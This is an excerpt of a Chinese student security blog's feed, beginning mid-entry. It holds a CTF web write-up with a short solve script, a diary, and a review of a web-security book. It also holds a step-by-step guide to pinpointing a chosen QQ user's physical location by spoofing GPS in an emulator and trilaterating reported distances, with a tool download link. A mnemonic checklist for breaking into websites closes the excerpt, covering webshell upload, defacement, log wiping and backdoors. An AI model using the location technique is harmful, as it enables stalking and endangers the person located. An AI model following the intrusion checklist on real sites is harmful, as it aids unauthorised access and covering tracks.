      &lt;p&gt;exploitdb监控和下载代码：&lt;/p&gt;
    
    </summary>
    
    
      <category term="python" scheme="http://austfish.cn/tags/python/"/>
    
      <category term="漏洞" scheme="http://austfish.cn/tags/%E6%BC%8F%E6%B4%9E/"/>
    
  </entry>
  
  <entry>
    <title>天下武功唯快不破:CTF-Web题WriteUp</title>
    <link href="http://austfish.cn/2017/10/24/%E5%A4%A9%E4%B8%8B%E6%AD%A6%E5%8A%9F%E5%94%AF%E5%BF%AB%E4%B8%8D%E7%A0%B4-CTF-Web%E9%A2%98WriteUp/"/>
    <id>http://austfish.cn/2017/10/24/天下武功唯快不破-CTF-Web题WriteUp/</id>
    <published>2017-10-24T01:29:49.000Z</published>
    <updated>2022-02-18T03:34:21.772Z</updated>
    
    <content type="html"><![CDATA[<p><strong>所需工具</strong></p><ol><li>实验吧：<a href="http://www.shiyanbar.com/" target="_blank" rel="noopener">http://www.shiyanbar.com/</a></li><li>题目链接：<a href="http://www.shiyanbar.com/ctf/1854" target="_blank" rel="noopener">http://www.shiyanbar.com/ctf/1854</a></li><li>解题链接： <a href="http://ctf5.shiyanbar.com/web/10/10.php" target="_blank" rel="noopener">http://ctf5.shiyanbar.com/web/10/10.php</a><a id="more"></a></li></ol><h1 id="天下武功唯快不破-CTF-Web题WriteUp"><a href="#天下武功唯快不破-CTF-Web题WriteUp" class="headerlink" title="天下武功唯快不破:CTF-Web题WriteUp"></a>天下武功唯快不破:CTF-Web题WriteUp</h1><h3 id="实验吧：http-www-shiyanbar-com"><a href="#实验吧：http-www-shiyanbar-com" class="headerlink" title="实验吧：http://www.shiyanbar.com/"></a>实验吧：<a href="http://www.shiyanbar.com/" target="_blank" rel="noopener">http://www.shiyanbar.com/</a></h3><p><img src="http://qiniu.austfish.cn/blog/20190929/hR4panAiA8nX.png?imageslim" alt="mark"></p><h3 id="题目链接：http-www-shiyanbar-com-ctf-1854"><a href="#题目链接：http-www-shiyanbar-com-ctf-1854" class="headerlink" title="题目链接：http://www.shiyanbar.com/ctf/1854"></a>题目链接：<a href="http://www.shiyanbar.com/ctf/1854" target="_blank" rel="noopener">http://www.shiyanbar.com/ctf/1854</a></h3><h3 id="解题链接：-http-ctf5-shiyanbar-com-web-10-10-php"><a href="#解题链接：-http-ctf5-shiyanbar-com-web-10-10-php" class="headerlink" title="解题链接： http://ctf5.shiyanbar.com/web/10/10.php"></a>解题链接： <a href="http://ctf5.shiyanbar.com/web/10/10.php" target="_blank" rel="noopener">http://ctf5.shiyanbar.com/web/10/10.php</a></h3><p>打开链接可以看到：</p><blockquote><p>There is no martial art is indefectible, while the fastest speed is the only way for long success.<br>—-You must do it as fast as you can!—-&lt;&lt;&lt;&lt;&lt;&lt;</p></blockquote><p><strong>从字面理解就是需要最快的速度去提交信息，然后获得flag。<br>题目有个小细节，就是在网页的源码中可以看到注释提示！</strong></p><blockquote><p>There is no martial art is indefectible, while the fastest speed is the only way for long success.<br><br>&gt;&gt;&gt;&gt;&gt;&gt;—-You must do it as fast as you can!—-&lt;&lt;&lt;&lt;&lt;&lt;<br><br><!-- please post what you find with parameter:key --></p></blockquote><h5 id="也就是需要用post去提交一个key值"><a href="#也就是需要用post去提交一个key值" class="headerlink" title="也就是需要用post去提交一个key值"></a>也就是需要用post去提交一个key值</h5><h5 id="抓包找寻题目的信息"><a href="#抓包找寻题目的信息" class="headerlink" title="抓包找寻题目的信息"></a>抓包找寻题目的信息</h5><h5 id="使用Chrome开发者工具查看http头的信息"><a href="#使用Chrome开发者工具查看http头的信息" class="headerlink" title="使用Chrome开发者工具查看http头的信息"></a>使用Chrome开发者工具查看http头的信息</h5><h5 id="刷新网页，在Nerwork中header可以看到报文信息！"><a href="#刷新网页，在Nerwork中header可以看到报文信息！" class="headerlink" title="刷新网页，在Nerwork中header可以看到报文信息！"></a>刷新网页，在Nerwork中header可以看到报文信息！</h5><p><img src="http://qiniu.austfish.cn/blog/20190929/HEIluRW5JKc1.png?imageslim" alt="mark"></p><h5 id="里面有个FLAG的base64加密的字符串，解密一波看看！"><a href="#里面有个FLAG的base64加密的字符串，解密一波看看！" class="headerlink" title="里面有个FLAG的base64加密的字符串，解密一波看看！"></a>里面有个FLAG的base64加密的字符串，解密一波看看！</h5><h5 id="P0ST-THIS-T0-CH4NGE-FL4G-8VWjFNjhN"><a href="#P0ST-THIS-T0-CH4NGE-FL4G-8VWjFNjhN" class="headerlink" title="P0ST_THIS_T0_CH4NGE_FL4G:8VWjFNjhN"></a><strong>P0ST_THIS_T0_CH4NGE_FL4G:8VWjFNjhN</strong></h5><h5 id="并不是题目要求的flag，毕竟不应该这么简单！"><a href="#并不是题目要求的flag，毕竟不应该这么简单！" class="headerlink" title="并不是题目要求的flag，毕竟不应该这么简单！"></a>并不是题目要求的flag，毕竟不应该这么简单！</h5><h5 id="解码的意思应该是让我们post传这个后面的字符串：8VWjFNjhN"><a href="#解码的意思应该是让我们post传这个后面的字符串：8VWjFNjhN" class="headerlink" title="解码的意思应该是让我们post传这个后面的字符串：8VWjFNjhN"></a>解码的意思应该是让我们post传这个后面的字符串：<strong>8VWjFNjhN</strong></h5><h5 id="使用Python几行代码搞定吧"><a href="#使用Python几行代码搞定吧" class="headerlink" title="使用Python几行代码搞定吧"></a>使用Python几行代码搞定吧</h5><p><code>import requestsimport base64a = requests.post(&#39;http://ctf5.shiyanbar.com/web/10/10.php&#39;,data={&#39;key&#39;:str(base64.b64decode(requests.get(&#39;http://ctf5.shiyanbar.com/web/10/10.php&#39;).headers[&#39;FLAG&#39;])).split(&#39;:&#39;)[-1].strip(&#39;\&#39;&#39;)})a.text</code></p><p> <img src="http://qiniu.austfish.cn/blog/20190929/7ybB5yULYNXa.png?imageslim" alt="mark"></p><h5 id="简单的解释一下就是获取网站中http报文信息的头信息中FLAG并对其解码，"><a href="#简单的解释一下就是获取网站中http报文信息的头信息中FLAG并对其解码，" class="headerlink" title="简单的解释一下就是获取网站中http报文信息的头信息中FLAG并对其解码，"></a>简单的解释一下就是获取网站中http报文信息的头信息中FLAG并对其解码，</h5><h5 id="然后通过中间的：分割字符串并获得后面的关键的字符串8VWjFNjhN，"><a href="#然后通过中间的：分割字符串并获得后面的关键的字符串8VWjFNjhN，" class="headerlink" title="然后通过中间的：分割字符串并获得后面的关键的字符串8VWjFNjhN，"></a>然后通过中间的：分割字符串并获得后面的关键的字符串8VWjFNjhN，</h5><h5 id="然后随手去掉多去的引号。"><a href="#然后随手去掉多去的引号。" class="headerlink" title="然后随手去掉多去的引号。"></a>然后随手去掉多去的引号。</h5><h5 id="把这个字符串作为key的键值通过POST传回去，"><a href="#把这个字符串作为key的键值通过POST传回去，" class="headerlink" title="把这个字符串作为key的键值通过POST传回去，"></a>把这个字符串作为key的键值通过POST传回去，</h5><h5 id="返回了FLAG"><a href="#返回了FLAG" class="headerlink" title="返回了FLAG"></a>返回了FLAG</h5><p> <img src="http://qiniu.austfish.cn/blog/20190929/SveLxlcdGAfz.gif" alt="mark"><br><em>hahahaha~<br>感谢bk帮我解决python上面的问题~</em></p>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;&lt;strong&gt;所需工具&lt;/strong&gt;&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;实验吧：&lt;a href=&quot;http://www.shiyanbar.com/&quot; target=&quot;_blank&quot; rel=&quot;noopener&quot;&gt;http://www.shiyanbar.com/&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;题目链接：&lt;a href=&quot;http://www.shiyanbar.com/ctf/1854&quot; target=&quot;_blank&quot; rel=&quot;noopener&quot;&gt;http://www.shiyanbar.com/ctf/1854&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;解题链接： &lt;a href=&quot;http://ctf5.shiyanbar.com/web/10/10.php&quot; target=&quot;_blank&quot; rel=&quot;noopener&quot;&gt;http://ctf5.shiyanbar.com/web/10/10.php&lt;/a&gt;
    
    </summary>
    
    
      <category term="CTF" scheme="http://austfish.cn/tags/CTF/"/>
    
      <category term="WP" scheme="http://austfish.cn/tags/WP/"/>
    
  </entry>
  
  <entry>
    <title>社工技巧分享：QQ号定位</title>
    <link href="http://austfish.cn/2017/06/17/%E7%A4%BE%E5%B7%A5%E6%8A%80%E5%B7%A7%E5%88%86%E4%BA%AB%EF%BC%9AQQ%E5%8F%B7%E5%AE%9A%E4%BD%8D/"/>
    <id>http://austfish.cn/2017/06/17/社工技巧分享：QQ号定位/</id>
    <published>2017-06-17T01:29:49.000Z</published>
    <updated>2022-02-18T03:34:22.405Z</updated>
    
    <content type="html"><![CDATA[<p><strong>所需工具</strong></p><ol><li>夜神模拟器</li><li>强制QQ聊天</li><li>QQ轻聊版</li><li>模拟位置工具<a id="more"></a></li></ol><h2 id="所需工具"><a href="#所需工具" class="headerlink" title="所需工具"></a>所需工具</h2><ol><li>夜神模拟器</li><li>强制QQ聊天</li><li>QQ轻聊版</li><li>模拟位置工具</li></ol><h2 id="为什么要用夜神模拟器呢？"><a href="#为什么要用夜神模拟器呢？" class="headerlink" title="为什么要用夜神模拟器呢？"></a>为什么要用夜神模拟器呢？</h2><blockquote><p>因为夜神模拟器附带模拟位置修改工具</p></blockquote><h2 id="为什么要用QQ轻聊版呢？"><a href="#为什么要用QQ轻聊版呢？" class="headerlink" title="为什么要用QQ轻聊版呢？"></a>为什么要用QQ轻聊版呢？</h2><blockquote><p>因为QQ轻聊版有现在普遍使用的QQ版本没有的功能</p></blockquote><h2 id="操作步骤"><a href="#操作步骤" class="headerlink" title="操作步骤"></a>操作步骤</h2><p><strong>1.打开强制聊天工具，输入你要定位的QQ号码，点击发起QQ回话。</strong></p><p><img src="http://qiniu.austfish.cn/blog/20190929/wwyYbbcF4QwI.png?imageslim%29" alt="image"></p><p><strong>2.进入目标的QQ主页，给他点一个赞！！记住，不可缺少的步骤！！！！</strong></p><p><img src="http://qiniu.austfish.cn/blog/20190929/TtnpLih6TkkE.png?imageslim" alt="mark"></p><p><strong>3.接着打开QQ轻聊版 附近的人 找到我赞过谁 可以看到上面显示的有距离</strong></p><p><img src="http://qiniu.austfish.cn/blog/20190929/euFIhr7SDgHt.png?imageslim" alt="mark"></p><p><strong>4.打开夜神模拟器，打开模拟位置修改。利用夜神模拟器多次模拟位置  找到目标精准位置</strong></p><p><img src="http://qiniu.austfish.cn/blog/20190929/yNxdL57El1F0.png?imageslim" alt="mark"></p><p><strong>5.然后通过谷歌地球专业版中标尺画圆三点快速定位</strong></p><p><img src="http://qiniu.austfish.cn/blog/20190929/nrhP2o9V7V7b.jpg?imageslim" alt="mark"></p><p>大概过程就是这样了，很简单的一个思路。<br>各位可以尝试一下。<br>但不是所有的都能成功！</p><p>亲测可行，如果有不成功的别掉头过来骂我是骗子</p><p>我只是分享一个思路而已。<br>夜神模拟器和Googleearthpro大家去百度下载 其余软件我会给你们打包<br>已经为你们打包所需软件，尽情玩耍吧</p><blockquote><p>下载地址：链接：<a href="http://pan.baidu.com/s/1eS1kHEi" target="_blank" rel="noopener">http://pan.baidu.com/s/1eS1kHEi</a> 密码：0u85</p></blockquote>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;&lt;strong&gt;所需工具&lt;/strong&gt;&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;夜神模拟器&lt;/li&gt;
&lt;li&gt;强制QQ聊天&lt;/li&gt;
&lt;li&gt;QQ轻聊版&lt;/li&gt;
&lt;li&gt;模拟位置工具
    
    </summary>
    
    
      <category term="社工" scheme="http://austfish.cn/tags/%E7%A4%BE%E5%B7%A5/"/>
    
      <category term="工具" scheme="http://austfish.cn/tags/%E5%B7%A5%E5%85%B7/"/>
    
  </entry>
  
  <entry>
    <title>四月的故事慢慢说</title>
    <link href="http://austfish.cn/2017/04/29/%E4%B8%80%E4%B8%83%E5%B9%B4%E5%9B%9B%E6%9C%88%E7%9A%84%E6%95%85%E4%BA%8B%E6%85%A2%E6%85%A2%E8%AF%B4/"/>
    <id>http://austfish.cn/2017/04/29/一七年四月的故事慢慢说/</id>
    <published>2017-04-29T01:29:49.000Z</published>
    <updated>2022-02-18T03:34:21.396Z</updated>
    
    <content type="html"><![CDATA[<p>四月的尾巴敲打着五月的脑门，提醒它要快快努力去完成深蓝的梦想！</p><a id="more"></a><p>五一的假期从昨天就开始了，连续两天去图书馆自习，才发现去图书馆自习的都是情侣。<br>这篇生活博客的初念应该是去年就想写了，一直没有动笔，可能是这个月的故事比较多，怕自己忘了大学青春里最美好的时光。<br>QAQAQA</p><h2 id="学校相关"><a href="#学校相关" class="headerlink" title="学校相关"></a>学校相关</h2><p>四月山南的出租车引起民愤了，黑车猖狂，一波一波的曝光总算有些用，作为纳税人一定要维护自己的权益不受侵犯。</p><p>社联网运部的萌新恶势力也更新了愚人节《团团来巡山》，最逗是视频最后被追着跑的小狗。哈哈&gt;_&lt;</p><p>月初也回家了一趟，和女朋友也是第一次吵架，分手24小时后和好，失去她才知道自己失去了全世界。</p><p>借着网易的微专业的石榴师傅的帮助，拿到刚开的教育平台SRC的邀请码，注册成功后却没有挖到一个属于自己的漏洞，这个目标交给下个月继续奋斗。</p><p>买了一本好贵好贵的手账，记录每天的计划和目标，可惜我的字不咋好看，导致整体美感不够。</p><p>和队友BK一起脑抽京东分期了个AOC的显示器，虽然心疼，但是效果还是很棒，一边码代码一边运行。</p><p>带着小伙伴组织了一场信息安全讲座，是我们EDI社团与合天网络安全实验室合作的，效果还不错。</p><h2 id="技术相关"><a href="#技术相关" class="headerlink" title="技术相关"></a>技术相关</h2><p>个人技术感觉进步不是很大。</p><p>手里的几个项目一直有些处于瘫痪状态。</p><p>中国软件杯的分布式爬虫还处于爬的状态，研究了几天终于搞出一个轻量级的百度百科python爬虫，但是好像没卵用。</p><p>用纪总推荐的织梦CMS帮智慧水团队写了一个网站，感觉好无脑，毕竟没有那么好的设计灵感。</p><p>数据库的课程设计从无脑的校园二手交易平台被宝老师换成他接的开发项目（掌上小强），公司内部的工作管理APP,表示很慌。</p><p>Web安全微专业的课程一直在有条不紊的走着，第三课的web安全工具我终于拿了个95分数，用DWVA的漏洞测试平台加深自己对漏洞的理解。<br>暴力破解走一波。</p><h2 id="生活相关"><a href="#生活相关" class="headerlink" title="生活相关"></a>生活相关</h2><p><strong>看过的书</strong><br>    《白帽子讲Web安全》<br>    《Web安全深度剖析》<br>    《第一行代码安卓（第一版）》（第二版已下单：使用AS作为开发工具的）<br>    《XSS跨站脚本攻击剖析与防御》<br>    《Hadoop实战》<br>    《PHP和MySQL Web开发》<br>    《信息安全数学基础》（这个重要，毕竟马上就要考试了）<br><strong>看过的电影</strong><br>    《嫌疑人X的献身》（好像就这个，心疼自己）<br><strong>去玩过的地方</strong><br>    去南京的夫子庙与总统府（和小公举）<br>    还有马鞍山<br><strong>五月计划</strong><br><strong>要看的书</strong><br>    《第一行代码安卓（第二版）》<br>    《Python核心编程》<br>    《JAVA从入门到精通》<br>    暂定<br><strong>要学的技术</strong><br>    分布式框架<br>    Web安全体系建设<br>    Android开发<br><strong>总结</strong><br>    这学期还是多锻炼写代码的能力，光看不写可不行。<br>    多尝试去做一下完整的项目。<br>    校园微信的项目可以去试试~<br>    毕竟互联网的大咖当年创业都是那么开始的，笑哭~<br>    加油加油加油！</p>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;四月的尾巴敲打着五月的脑门，提醒它要快快努力去完成深蓝的梦想！&lt;/p&gt;
    
    </summary>
    
    
      <category term="生活" scheme="http://austfish.cn/tags/%E7%94%9F%E6%B4%BB/"/>
    
      <category term="计划" scheme="http://austfish.cn/tags/%E8%AE%A1%E5%88%92/"/>
    
  </entry>
  
  <entry>
    <title>《白帽子讲Web安全》读后感</title>
    <link href="http://austfish.cn/2017/04/28/%E3%80%8A%E7%99%BD%E5%B8%BD%E5%AD%90%E8%AE%B2Web%E5%AE%89%E5%85%A8%E3%80%8B%E8%AF%BB%E5%90%8E%E6%84%9F/"/>
    <id>http://austfish.cn/2017/04/28/《白帽子讲Web安全》读后感/</id>
    <published>2017-04-28T01:29:49.000Z</published>
    <updated>2022-02-18T03:34:21.387Z</updated>
    
    <content type="html"><![CDATA[<p><strong>——Deep Blue<br>(一个安全小兵的感受)</strong></p><p>这是一篇作业；这是一篇读后感；这是一篇记录安全的感悟；这是一篇对道哥的敬仰；这是我安全启蒙的钥匙……</p><a id="more"></a><p>和《白帽子讲Web安全》的缘分来自一个小意外，在来大学之前的我选择了信息安全这个专业。通过各种渠道吧，我在方方面面了解到这个行业的那些事儿，一点一滴的积累这我的安全观。指导我遇见这本书，第一次觉得安全原来是那么清晰的展示在我眼前。“互联网本来是安全的，自从有了研究安全的人之后，互联网就变得不安全了”当我看到这一句的时候，毫不犹豫的把它作为我的签名，原来我们才是让互联网变得不安全的人啊！</p><p>初来大学，第一次进入图书馆。当我发现AUST图书馆也藏有这本书的时候，我是多么激动，转便了所有的书架找到这本书。可以说是笑着抱回宿舍，开始了我的第一次阅读。</p><p>第一次看道哥的作品难度还是很大的，整本书四篇十八章，包括世界观安全、客户端脚本安全、服务端应用安全以及互联网公司安全运营四大部分。当时还是大一小萌新的我只看了世界观安全，第一次彻底了解到ROOT是个啥，以前只知道手机ROOT能删除一些系统应用。当我知道“root”对黑客的吸引，就像大米对老鼠，美女对色狼的吸引的时候，立下一个小flag拿下一个网站的root。不想拿到“root”的黑客，不是好黑客。说到黑客我也又不得不多说点，在黑客的世界里，有的黑客，精通计算机技术，能够自己挖掘漏洞，并编写“exploit”（黑客们使用的漏洞利用代码叫做exploit）；而有的黑客，只是对攻击本身感兴趣，对计算机原理和各种编程技术的了解比较粗浅，因此只懂得编译别人的代码，自己并没有动手能力，这种黑客被称为“Script Kids”（脚本小子）。在现实世界中，真正造成破坏的，往往并非那些挖掘并研究漏洞的“黑客们”，而是这些脚本小子。在安全的道路上总是有人疑惑自己已经到了那一步，曾看到这样一个分级：会使用工具找漏洞就属于初级，能写自己的黑客工具应该就是中级阶段，能自动化“挖漏洞”就属于高级的大牛了。谈黑客，这本书中的黑客简史真的深深的吸引了我。</p><p>中国黑客发展分为三个阶段：启蒙时代、黄金时代、黑暗时代</p><h4 id="启蒙时代"><a href="#启蒙时代" class="headerlink" title="启蒙时代"></a>启蒙时代</h4><p>20世纪90年代，也正是中国互联网刚刚起步阶段，热爱新兴技术的青年收到国外黑客技术影响，开始研究安全漏洞。启蒙时代的黑客大多由于个人爱好走上这条路，好奇心和求知欲是他们前进的动力，没有任何利益瓜葛。这个时期的中国黑客们通过互联网，看到了世界，因此与西方发达国家同期诞生的黑客精神是一脉相传的，他们崇尚分享、自由、免费的互联网精神，并热衷于分钟自己的最新研究成果。</p><h4 id="黄金时代"><a href="#黄金时代" class="headerlink" title="黄金时代"></a>黄金时代</h4><p>以2001年中美黑客大战为标志（感兴趣的同学可以百度一下“中美黑客大战”，相信大家都记得2001年中国飞行员王伟为了捍卫国家主权，被美国侦察机撞毁事件，起因正是这件事，这次事件中，中国黑客空前团结，与美国黑客开展了一场激烈的黑客大战，非常轰动，也这是世界第一次黑客大战），这次事件大大推动了中国黑客的发展，崛起了一批黑客、红客联盟，也让黑客这个特殊群体一下吸引了社会的眼球，黑客圈子所宣扬的黑客文化和黑客技术的独特魅力也吸引了无数的青少年走上黑客这条道路。这次事件之后，各种黑客组织如雨后春笋般冒出，他们普遍的特点是：年轻、有活力、充满激情，但技术上也许还不够成熟。此时，黑客圈子里贩卖漏洞、恶意软件的现象开始升温，因为黑客群体良莠不齐，开始出现以赢利为目的的攻击行为，黑色产业链逐渐成型。</p><h4 id="黑暗时代"><a href="#黑暗时代" class="headerlink" title="黑暗时代"></a>黑暗时代</h4><p>这个时代大概从几年前开始一直持续到现在（PS. 是哪一年呢？个人觉得大概是07年底左右开始吧），也许还将继续下去。这个时期的黑客组织也遵循社会发展规律，优胜劣汰，大多数黑客组织没有坚持下去，20世纪非常流行的黑客技术论坛也越来越没有人气，最终走向没落。所有门户型的漏洞披露站点，再也不公布任何漏洞相关技术细节。随着安全产业发展，黑客的功利性越来越强，黑色产业链开始成熟。在20世纪技术还不太成熟的黑客们，凡是坚持下来的，都已经成为安全领域的高级人才，要么，在安全公司贡献自己的专业技能，要么带着非常强的技术进入黑色产业。此时期的黑客群体因为互相之间缺失信任，已经不再具有开放和分享的精神，最纯粹的黑客精神实质上已经死亡。整个互联网笼罩在黑色产业链的阴影之下，每年数十亿经济损失和数千万网民受害，黑客精神的死亡，让我们没有理由不把这个时代称为黑暗时代。也许，黑客精神所代表的Open、Free、Share，真的一去不复返了！</p><p>真羡慕那个令人热血的时代，但如今依旧是互联网充满机遇的时代！</p><p>不过你知道吗？ “黑客”是有好坏之分的！白帽子、黑帽子，他们是谁：在黑客的世界中，往往用帽子的颜色来比喻黑客的好坏。白帽子，是指那些精通安全技术，工作在反黑客领域的专家们；而黑帽子，是指利用黑客技术造成破坏，甚至进行网络犯罪的群体。</p><p>白帽子和黑帽子工作的心态完全不同：正是因为白帽子和黑帽子的目标不同，所以他们在工作时的心态是完全不同的。对于黑帽子来说，只要能够找到系统的一个弱点，就可以达到入侵系统的目的；而对于白帽子来说，必须找到系统的所有弱点，不能有遗漏，才能保证系统不会出现问题。白帽子要求全面宏观、黑帽子思考问题是有选择性的、微观的：白帽子一般为企业或安全公司服务，工作的出发点就是要解决所有的安全问题，因此所看所想必然要求更加的全面、宏观；黑帽子的主要目的是要入侵系统，找到对他们有价值的数据，因此黑帽子只需要以点突破，找到对他们最有用的一点，以此渗透，因此思考问题的出发点必然是有选择性的、微观的。</p><p>从对待问题的角度来看，黑帽子是不断组合问题，白帽子是不断分解问题：黑帽子为了完成一次入侵，需要利用各种不同漏洞的组合来达到目的，是在不断地组合问题；而白帽子在设计解决方案时，如果只看到各种问题组合后产生的效果，就会把事情变复杂，难以细致入微地解决根本问题，所以白帽子必然是在不断地分解问题，再对分解后的问题逐个予以解决。这种定位的不对称，也导致了白帽子的安全工作比较难做。“破坏永远比建设容易”，白帽子选择的方法，是克服某种攻击方法，而并非抵御单次的攻击。</p><p>安全问题往往发生在一些意想不到的地方：上述一切都是理想状态，在现实世界中，存在着各种各样不可回避的问题。工程师们很喜欢一句话：“No Patch For Stupid！”，在安全领域也普遍认为：“最大的漏洞就是人！”。写得再好的程序，在有人参与的情况下，就可能会出现各种各样不可预知的情况，比如管理员的密码有可能泄露，程序员有可能关掉了安全的配置参数，等等。安全问题往往发生在一些意想不到的地方。防御技术在不断完善的同时，攻击技术也在不断地发展。这就像一场军备竞赛，看谁跑在前面。</p><p>世界安全观不仅仅讲的是黑客是理念，更多的是思想。道哥也点出安全问题的本质是信任的安全问题。一切的安全方案设计的基础，都是建立在信任关系上的。我们必须相信一些东西，必须有一些最基本的假设，安全方案才能得以建立；如果我们否定一切，安全方案就会如无源之水，无根之木，无法设计，也无法完成。<br>把握住信任条件的度，是安全的艺术魅力：在现实生活中，我们很少设想最极端的前提条件，因为极端的条件往往意味者小概率以及高成本，因此在成本有限的情况下，我们往往会根据成本来设计安全方案，并将一些可能性较大的条件作为决策的主要依据。</p><p>从另一个角度来说，一旦我们作为决策依据的条件被打破、被绕过，那么就会导致安全假设的前提条件不再可靠，变成一个伪命题。因此，把握住信任条件的度，使其恰到好处，正是设计安全方案的难点所在，也是安全这门学问的艺术魅力所在。<br>安全的世界里，没有一劳永逸的银弹：在解决安全问题的过程中，不可能一劳永逸，也就是说“没有银弹”。任何人想要一劳永逸地解决安全问题，都属于一相情愿，是“自己骗自己”，是不现实的。</p><p>安全是一个持续的过程。 自从互联网有了安全问题以来，攻击和防御技术就在不断碰撞和对抗的过程中得到发展。从微观上来说，在某一时期可能某一方占了上风；但是从宏观上来看，某一时期的攻击或防御技术，都不可能永远有效，永远用下去。这是因为防御技术在发展的同时，攻击技术也在不断发展，两者是互相促进的辩证关系。以不变的防御手段对抗不断发展的攻击技术，就犯了刻舟求剑的错误。在安全的领域中，没有银弹。</p><p>我的世界安全观就这么建立了吧，安全问题的本质是信任的问题。并且安全是一个持续的过程，并不存在所谓的银弹。也知道一个安全评估的过程可以分为4个阶段：资产等级划分、威胁分析、风险分析、确认解决方案。虽然懵懵懂懂但总算是读下来了，还有那几个不太懂的白帽子兵法 1.Secure By Default 原则（白名单黑名单、最小权限原则）2.纵深防御原则 3.数据和代码分离原则 4.不可预测性原则</p><p>可喜可贺的是我也拥有了一本自己的《白帽子讲Web安全》这本书了，再也不用担心图书馆的这本书会被借走了。也在慢慢接触Web安全的一些漏洞。</p><p>Web 攻击技术发展的几个阶段：①Web 1.0时代，人们更多的是关注服务器端动态脚本的安全问题，比如将一个可执行脚本（俗称webshell）上传到服务器上，从而获得权限。动态脚本语言的普及，以及 Web 技术发展初期对安全问题认知的不足导致很多“血案”的发生，同时也遗留下很多历史问题，比如PHP 语言至今仍然只能靠较好的代码规范来保证没有文件包含漏洞，而无法从语言本身杜绝此类安全问题的发生。②SQL注入的出现是Web 安全史上的一个里程碑。SQL注入最早出现在 1999年，并很快就成为Web 安全的头号大敌。通过SQL 注入攻击，可以获取很多重要的、敏感的数据，甚至能够通过数据库获取系统访问权限，这种效果并不比直接攻击系统软件差，Web 攻击一下子就流行起来。（SQL 注入漏洞至今仍然是Web 安全领域中的一个重要组成部分。）③XSS （跨站脚本攻击）的出现则是 Web 安全史上的另一个里程碑。实际上，XSS 的出现时间和SQL 注入差不多，但是真正引起人们重视则是在大概  2003年以后。在著名的是2005年的MySpace的XSS 蠕虫事件后，安全界对 XSS 的重视程度提高了很多。④随着Web 2.0 的兴起，XSS 、CSRF（跨站请求伪造） 等攻击已经变得更为强大。Web 攻击的思路也从服务器端转向了客户端，转向了浏览器和用户。黑客们天马行空的思路，覆盖了Web 的每一个环节，变得更加的多样化。⑤互联网的蓬勃发展，也催生出许多新兴的脚本语言，比如Python 、Ruby、NodeJS等，敏捷开发成为互联网的主旋律。而手机技术、移动互联网的兴起，也给HTML 5 带来了新的机遇和挑战。Web安全技术，也紧跟着互联网发展脚步，不断地演化出新的变化。（以上名词：SQL注入、XSS跨站、CSRF跨站伪请求伪造等，不明白意思没关系，先熟悉个名词吧，知道它们是WEB应用安全的重要敌人就行，后面慢慢讲解他们具体是什么，有什么危害，怎么防范）</p><p>暂且研究了这么多，互联网公司的安全运营还得需要一个更坚实的基础去学习。</p><h4 id="给自己一个小目标"><a href="#给自己一个小目标" class="headerlink" title="给自己一个小目标"></a>给自己一个小目标</h4><ul><li>目标一：让工程师写出的每一行代码都是安全的。</li><li>目标二：让所有已知的、未知的攻击，都能在第一时间发现，并迅速报警和追踪。</li><li>目标三：让安全成为公司核心竞争力，深入到每一个产品的特性中，能够更好地引导用户使用互联网的习惯。</li><li>目标四：能够观测到互联网安全趋势的变化，对未来一段时间内的风险做出预测。</li></ul><p>最后再提起安全问题的本质:</p><ul><li><strong>安全问题的本质是信任问题。</strong></li><li><strong>把握信任条件的度，使其恰到好处。</strong></li><li><strong>安全是一个持续的过程。</strong></li><li><strong>安全是为业务服务的。</strong></li></ul><p>Find and Fix,  Defend and Defer,  Secure at the Source.<br> 待我第三次阅读我想一定会有新的收获，届时我会继续更新这篇文章。</p>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;&lt;strong&gt;——Deep Blue&lt;br&gt;(一个安全小兵的感受)&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;这是一篇作业；这是一篇读后感；这是一篇记录安全的感悟；这是一篇对道哥的敬仰；这是我安全启蒙的钥匙……&lt;/p&gt;
    
    </summary>
    
    
      <category term="安全" scheme="http://austfish.cn/tags/%E5%AE%89%E5%85%A8/"/>
    
      <category term="读书" scheme="http://austfish.cn/tags/%E8%AF%BB%E4%B9%A6/"/>
    
  </entry>
  
  <entry>
    <title>Web渗透三字经</title>
    <link href="http://austfish.cn/2017/04/10/web%E6%B8%97%E9%80%8F%E4%B8%89%E5%AD%97%E7%BB%8F/"/>
    <id>http://austfish.cn/2017/04/10/web渗透三字经/</id>
    <published>2017-04-10T01:29:49.000Z</published>
    <updated>2022-02-18T03:34:21.354Z</updated>
    
    <content type="html"><![CDATA[<p><strong>网络上曾流传一段Web渗透三字经，如下：</strong></p><a id="more"></a><blockquote><p>  用搜索<br>  找注入<br>  没注入<br>  就旁注<br>  没旁注<br>  用0day<br>  没0day<br>  扫目录<br>  找后台<br>  爆账户<br>  传小马<br>  放大马<br>  拿权限<br>  挂页面<br>  放暗链<br>  清数据<br>  清日志<br>  留后门</p></blockquote><p><strong>然后我对它做了简单的分析</strong></p><blockquote><p>用搜索 ：使用搜索引擎去找目标站点的注入点或漏洞（百度高级搜索 Google hack ）<br>找注入 ：通过web漏洞扫描工具或者一些公开漏洞库去寻找相关注入点<br>就旁注 ：通过bing英文去搜索目标站点的相关网站 借助其他网站进入主机内部<br>用0day ： 找到漏洞点就可以去找漏洞的破解利用脚本 程序等<br>扫目录 ：利用御剑或者其他扫描工具去扫描站点目录<br>找后台 ：在站点目录中确定到后台登陆界面<br>爆账户 ：对管理员账户进行暴力破解<br>传小马 ：通过后台管理界面 找到插入一句话木马的地方 用中国菜刀连接<br>放大马 ：通过中国菜刀上传webshell 大马<br>​拿权限 ：如果是普通用户权限 就需要工具或脚本提权root<br>挂页面  :在网站后台上传黑页等恶意网页<br>放暗链 ：在目标站点的网页源码中插入恶意网址<br>清数据 : 把后台操作的相关改动回复<br>清日志 ：清除服务器日志文件的登陆与操作记录<br>留后门 ：利用webshell隐藏在某个目录下 方便以后快速登陆后台</p></blockquote>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;&lt;strong&gt;网络上曾流传一段Web渗透三字经，如下：&lt;/strong&gt;&lt;/p&gt;
    
    </summary>
    
    
      <category term="web" scheme="http://austfish.cn/tags/web/"/>
    
